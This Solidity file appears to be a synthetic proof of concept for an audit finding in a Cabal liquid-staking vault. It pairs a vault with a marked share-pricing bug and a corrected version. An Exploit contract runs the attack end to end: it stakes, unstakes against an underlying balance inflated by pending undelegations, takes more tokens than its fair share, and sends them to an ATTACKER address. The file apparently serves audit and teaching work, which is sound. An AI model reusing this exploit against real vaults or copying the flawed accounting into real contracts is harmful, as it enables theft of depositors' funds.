// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cabal process_lp_unstake (Code4rena, AuditVault #56895).
    SYNTHETIC of the Move accounting bug, cheatcode-free, one transaction.

    Unstake burns shares immediately. The validator undelegation is still
    pending, so those tokens stay inside the underlying balance. The next
    unstake prices shares against that inflated balance. In the report's
    numbers, 50 shares unbond 75 tokens instead of 50. */

contract Mini {
    string public constant name = "Cabal ULP";
    string public constant symbol = "ULP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CabalVault {
    Mini public immutable token;
    uint256 public totalShares;
    uint256 public totalUnderlying;
    uint256 public unstaked_pending_amounts;
    mapping(address => uint256) public sharesOf;
    mapping(address => uint256) public pendingOf;

    constructor(Mini token_) {
        token = token_;
    }

    function process_lp_stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 shares = totalShares == 0 ? amount : amount * totalShares / totalUnderlying;
        totalShares += shares;
        totalUnderlying += amount;
        sharesOf[msg.sender] += shares;
    }

    function process_lp_unstake(uint256 shares) external returns (uint256 unbonding_amount) {
        require(sharesOf[msg.sender] >= shares, "shares");
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        uint256 lp_amount = totalUnderlying;
        // @> VULN: lp_amount still includes unstaked_pending_amounts whose shares were already burned
        unbonding_amount = shares * lp_amount / (totalShares + shares);
        unstaked_pending_amounts += unbonding_amount;
        pendingOf[msg.sender] += unbonding_amount;
    }

    function batch_undelegate_pending_lps(address a, address b) external {
        uint256 payA = pendingOf[a];
        uint256 payB = pendingOf[b];
        pendingOf[a] = 0;
        pendingOf[b] = 0;
        unstaked_pending_amounts -= payA + payB;
        totalUnderlying -= payA + payB;
        if (payA > 0) token.transfer(a, payA);
        if (payB > 0) token.transfer(b, payB);
    }
}

contract CabalVaultFixed {
    Mini public immutable token;
    uint256 public totalShares;
    uint256 public totalUnderlying;
    uint256 public unstaked_pending_amounts;
    mapping(address => uint256) public sharesOf;
    mapping(address => uint256) public pendingOf;

    constructor(Mini token_) {
        token = token_;
    }

    function process_lp_stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 base = totalUnderlying - unstaked_pending_amounts;
        uint256 shares = totalShares == 0 ? amount : amount * totalShares / base;
        totalShares += shares;
        totalUnderlying += amount;
        sharesOf[msg.sender] += shares;
    }

    function process_lp_unstake(uint256 shares) external returns (uint256 unbonding_amount) {
        require(sharesOf[msg.sender] >= shares, "shares");
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        uint256 lp_amount = totalUnderlying - unstaked_pending_amounts;
        unbonding_amount = shares * lp_amount / (totalShares + shares);
        unstaked_pending_amounts += unbonding_amount;
        pendingOf[msg.sender] += unbonding_amount;
    }

    function batch_undelegate_pending_lps(address a, address b) external {
        uint256 payA = pendingOf[a];
        uint256 payB = pendingOf[b];
        pendingOf[a] = 0;
        pendingOf[b] = 0;
        unstaked_pending_amounts -= payA + payB;
        totalUnderlying -= payA + payB;
        if (payA > 0) token.transfer(a, payA);
        if (payB > 0) token.transfer(b, payB);
    }
}

contract LpUser {
    function stake(CabalVault vault, Mini token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.process_lp_stake(amount);
    }

    function unstake(CabalVault vault, uint256 shares) external {
        vault.process_lp_unstake(shares);
    }

    function stakeFixed(CabalVaultFixed vault, Mini token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.process_lp_stake(amount);
    }

    function unstakeFixed(CabalVaultFixed vault, uint256 shares) external {
        vault.process_lp_unstake(shares);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant STAKE_A = 100 ether;
    uint256 internal constant STAKE_B = 50 ether;

    Mini public token;
    CabalVault public vault;
    LpUser public userB;
    uint256 public sharesAfterB;
    uint256 public underlyingAfterB;
    uint256 public pendingAfterB;
    uint256 public unbondingSeen;
    uint256 public fairAmount;
    uint256 public paidToA;
    uint256 public leftForRemaining;

    function run() external {
        token = new Mini();
        vault = new CabalVault(token);
        userB = new LpUser();
        token.mint(address(userB), STAKE_B);
        token.mint(address(this), STAKE_A);
        token.approve(address(vault), STAKE_A);
        userB.stake(vault, token, STAKE_B);
        vault.process_lp_stake(STAKE_A);
        userB.unstake(vault, STAKE_B);
        sharesAfterB = vault.totalShares();
        underlyingAfterB = vault.totalUnderlying();
        pendingAfterB = vault.unstaked_pending_amounts();
        fairAmount = STAKE_A / 2;
        unbondingSeen = vault.process_lp_unstake(fairAmount);
        vault.batch_undelegate_pending_lps(address(this), address(userB));
        paidToA = token.balanceOf(address(this));
        leftForRemaining = token.balanceOf(address(vault));
        token.transfer(ATTACKER, paidToA);
    }
}
